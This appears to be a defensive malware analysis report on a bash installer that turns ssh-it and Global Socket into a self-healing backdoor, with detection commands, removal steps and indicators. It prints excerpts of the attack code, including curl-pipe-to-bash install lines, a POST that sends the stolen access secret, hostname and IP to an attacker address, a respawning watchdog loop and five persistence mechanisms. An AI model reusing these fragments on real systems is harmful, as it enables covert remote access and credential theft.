# GSOCKET_SSHIT — Analysis Report

**Sample:** `22585585074dfaf862ab5bf0de958b99f146f0942b651af4f2f3ff3077b2513b`
**TLP:WHITE** · Author: AfterPacket · Analysed: 2026-08-08 · Samples: 1

> **Scope note.** THC Global Socket and ssh-it are legitimate, published
> security tools with lawful uses. This report targets the **attacker's
> deployment wrapper** and its exfil callback. Attribute the abuse, not the
> tool. `gsocket.io`, `thc.org` and `github.com` must never be blocklisted.

---

## 1. Incident summary

A 538-line bash installer delivered over SSH to `/da` on 2026-08-02 from
`192.253.248.92`. It wraps two legitimate tools — ssh-it and THC Global Socket —
into a persistent, self-healing backdoor, then exfiltrates the resulting access
credential to `192.253.248.9`, a host in the same /24 as the delivery IP.

**VirusTotal 2/60** at capture — remarkably low for a fully functional
persistent backdoor installer, and a direct consequence of the payload being a
signed, legitimate tool.

This is the highest-risk family in the capture. It establishes interactive
remote access, installs **five** independent persistence mechanisms, and runs a
watchdog that **regenerates access and re-notifies the operator whenever the
implant is killed**.

## 2. Phase 1 — Triage

| Field | Value |
|-------|-------|
| SHA-256 | `22585585074dfaf862ab5bf0de958b99f146f0942b651af4f2f3ff3077b2513b` |
| MD5 | `5d3646759b4618540e0eca570f570d5b` |
| SHA-1 | `d3589e1eba9d1d7308bdefaf252c4b2c7cd7e492` |
| Size | 20821 B / 538 lines |
| Type | Bourne-Again shell script, UTF-8, executable |
| Delivery | SSH, dropped as `/da`, from `192.253.248.92` |
| First seen | 2026-08-02T11:52:45Z |
| VT | 2/60 (`downloader.prng/shell`) |

## 3. Phase 2 — Configuration block

Lines 6–21, verbatim:

```bash
URL_BASE="https://github.com/hackerschoice/binary/raw/main/ssh-it/"
URL_DEPLOY="https://thc.org/ssh-it/x"
PKG_NAME="ssh-it-pkg"

GS_UPLOAD_URL="http://192.253.248.9/gsocket/up.php"
GSOCKET_INSTALL_CRL='bash -c "$(curl -fsSL https://gsocket.io/y)"'
GSOCKET_INSTALL_WGT='bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"'

WATCHDOG_SCRIPT="$HOME/.config/prng/watchdog.sh"
WATCHDOG_SERVICE="gsocket-watchdog.service"
GS_OUTPUT_FILE="$HOME/.config/prng/gs_output.log"
GS_LINE_FILE="$HOME/.config/prng/gs_line.txt"
```

Every URL except `GS_UPLOAD_URL` points at legitimate infrastructure.
`GS_UPLOAD_URL` is the only attacker-owned endpoint in the file — and it is the
one that matters.

The script's own banner (line 3) is candid:

```
# Modified ssh-it installer + gsocket auto-install + PERSISTENCE
# Auto-restarts if killed. Installs as systemd + crontab + watchdog.
```

## 4. Phase 3 — Capabilities

### 4.1 Credential exfiltration — the core capability

`upload_gsnetcat_line()`, lines 44–54:

```bash
curl -fsSL -X POST "$GS_UPLOAD_URL" \
    --data-urlencode "data=$line" \
    --data-urlencode "host=$(hostname)" \
    --data-urlencode "ip=$(curl -fsSL -4 ifconfig.me 2>/dev/null || ...)"
```

`$line` is the `gs-netcat -s "<secret>" -i` string, scraped from installer
output by `extract_and_upload()` (lines 62–96). **That string is the access
credential.** Anyone holding it can connect to the victim through the relay
network.

The beacon therefore carries victim hostname, victim public IP, and working
credentials — an unusually complete victim record.

### 4.2 Self-healing watchdog

The embedded watchdog (heredoc, lines 147–230) loops every 30 s:

```bash
while true; do
    if ! check_gsnetcat; then reinstall_gsocket; fi
    sleep 30
done
```

`reinstall_gsocket()` re-runs the gsocket installer, extracts a **new** secret,
and POSTs it to `192.253.248.9`.

> **Killing the process is not containment.** It triggers reinstallation,
> generates fresh attacker access, and notifies the attacker that someone
> intervened. See §6 for the mandatory removal order.

### 4.3 Lateral movement
ssh-it hooks the host's own SSH client to propagate along existing trust
relationships as the user authenticates outward. `_DEFAULT_THC_DEPTH=2` — it
will chain two hops.

### 4.4 Host fingerprinting
`hostname`, `ifconfig.me` for public IP, `whoami`/`id -un`/`id -u` in
`init_vars()`.

## 5. Phase 4 — C2 protocol

**Two separate channels — this distinction drives the whole mitigation strategy.**

| Channel | Transport | Addressed by | Blockable? |
|---------|-----------|--------------|-----------|
| Interactive C2 | Global Socket Relay Network, encrypted | **shared secret** | **No** |
| Exfil beacon | HTTP POST, cleartext | `192.253.248.9` | **Yes** |

The GSRN addresses peers by secret, not host. There is no attacker hostname or
IP anywhere in the C2 path, so **no blocklist, sinkhole or DNS RPZ can touch
it**. The only preventive control is default-deny egress.

The exfil endpoint is ordinary attacker infrastructure and is fully
sinkholable — see `CAPTURE_20260807_infrastructure_and_sinkhole.md` §5.

## 6. Phase 5 — Persistence

Five independent mechanisms:

| # | Mechanism | Detail |
|---|-----------|--------|
| 1 | systemd | `/etc/systemd/system/gsocket-watchdog.service`, `Restart=always`, `RestartSec=10`, **`StartLimitBurst=0`** |
| 2 | crontab | `* * * * * $HOME/.config/prng/watchdog.sh` |
| 3 | crontab | `@reboot sleep 10 && $HOME/.config/prng/watchdog.sh` |
| 4 | shell rc | `.bashrc`, `.profile`, `.zshrc`, `.bash_profile` — each gets a `# GSocket Watchdog auto-start` block |
| 5 | watchdog | `~/.config/prng/watchdog.sh`, mode 755, started via `nohup` |

`StartLimitBurst=0` disables systemd's restart-rate limiter, so the unit
restarts indefinitely rather than entering a failed state. Mechanisms 2 and 3
are installed as a fallback when `sudo` is unavailable (lines 505–507).

### Mandatory removal order

```
1. systemctl disable --now gsocket-watchdog.service && rm /etc/systemd/system/gsocket-watchdog.service
2. crontab -e   — remove the per-minute and @reboot entries
3. strip the "GSocket Watchdog auto-start" blocks from .bashrc/.profile/.zshrc/.bash_profile
4. rm -rf ~/.config/prng/ /tmp/thc_tmp /tmp/gsocket_watchdog.pid /tmp/gsocket_restart_count.txt
5. ONLY NOW: pkill -f gs-netcat
6. rotate every credential and SSH key on the host, and audit outward SSH trust
```

Step 6 is not optional. The secret was exfiltrated, and ssh-it propagates along
the host's own SSH relationships.

## 7. Phase 6 — Attribution

Not a named malware family — a bespoke wrapper around two public tools. The
operator's own infrastructure is a single host, `192.253.248.9`, in the same /24
as the delivery IP `192.253.248.92`. Same operator, minimal infrastructure
investment; the tooling cost was outsourced to legitimate projects.

Tradecraft is competent but not stealthy: the script prints a coloured banner
and a completion summary. It is built for scale, not for evading a defender who
is actually looking.

## 8. Phase 7 — Host detection

```bash
ls -la ~/.config/prng/ 2>/dev/null                 # best single indicator
ls -la /etc/systemd/system/*.service | grep -v dpkg
systemctl list-units --all | grep -i gsocket
crontab -l 2>/dev/null | grep -i "prng\|watchdog"
grep -l "gsocket-watchdog" ~/.bashrc ~/.profile ~/.zshrc ~/.bash_profile 2>/dev/null
grep -rl "192.253.248.9\|gsocket/up.php" /home /root /tmp 2>/dev/null
pgrep -x gs-netcat
ls -la /tmp/thc_tmp /tmp/gsocket_watchdog.pid 2>/dev/null
```

`~/.config/prng/` collides with nothing legitimate and is the strongest single
hunt path for this family.

**Behavioural detection**, since the C2 cannot be blocked by name: long-lived
outbound TLS from a host with no business making it; any process respawning
within ~30 s of every kill; outbound POST to a bare IP containing `hostname`;
`curl`/`wget` to `ifconfig.me` from a server.

## 9. Phase 8 — MITRE ATT&CK

| ID | Technique | Implementation |
|----|-----------|----------------|
| T1078 | Valid Accounts | SSH delivery |
| T1059.004 | Unix Shell | bash installer |
| T1543.002 | Systemd Service | `gsocket-watchdog.service` |
| T1053.003 | Cron | per-minute + `@reboot` |
| T1546.004 | Shell Config Modification | four rc files |
| T1036 | Masquerading | legitimate signed tool as payload |
| T1082 | System Information Discovery | `hostname`, `id` |
| T1614 | System Location Discovery | `ifconfig.me` |
| T1021.004 | Remote Services: SSH | ssh-it, depth 2 |
| T1573 | Encrypted Channel | GSRN |
| T1041 | Exfiltration Over C2 Channel | credential POST |

## 10. IOC table

| Type | Value | Confidence |
|------|-------|-----------|
| SHA-256 | `22585585074dfaf862ab5bf0de958b99f146f0942b651af4f2f3ff3077b2513b` | — |
| IP | `192.253.248.9` | HIGH — exfil endpoint, config block |
| IP | `192.253.248.92` | HIGH — direct capture, delivery |
| URL | `http://192.253.248.9/gsocket/up.php` | HIGH |
| Path | `~/.config/prng/{watchdog.sh,gs_output.log,gs_line.txt,thc_cli}` | HIGH |
| Path | `/etc/systemd/system/gsocket-watchdog.service` | HIGH |
| Path | `/tmp/thc_tmp`, `/tmp/gsocket_watchdog.pid` | HIGH |
| String | `GS_UPLOAD_URL`, `URL_DEPLOY`, `GS_OUTPUT_FILE` | HIGH |
| Port | 80 (exfil) | — |
| **Do not block** | `gsocket.io`, `thc.org`, `github.com`, `ifconfig.me` | — |

**Artifacts:** `yara/GSOCKET_SSHIT_persist.yar` ·
`suricata/gsocket_sshit.rules` (9004001–9004003) · `ioc/GSOCKET_SSHIT_ioc.txt`
